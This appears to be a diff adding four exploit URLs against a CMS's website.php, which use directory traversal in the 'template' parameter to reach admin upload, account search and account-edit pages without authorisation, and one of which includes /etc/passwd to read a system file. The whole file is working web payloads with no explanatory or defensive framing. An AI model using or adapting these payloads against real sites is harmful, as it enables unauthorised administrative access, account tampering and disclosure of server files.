@@ -1,0 +1,4 @@
+http://www.example.com/cmspath/website.php?template=../system/03_admin/edit/upload&amp;site_pool=/
+http://www.example.com/cmspath/website.php?template=../system/03_admin/edit/individual&amp;include=/etc/passwd
+http://www.example.com/cmspath/website.php?template=../system/admin/accounts&amp;action2=searchaccounts&amp;accounts_group=2
+http://www.example.com/cmspath/website.php?template=../system/admin/accounts&amp;action2=searchaccounts&amp;accounts_group=2&amp;action=editaccount&amp;accounts_lastname=&amp;accounts_email=&amp;accounts_group=2&amp;account_key=&lt;account_key&gt;
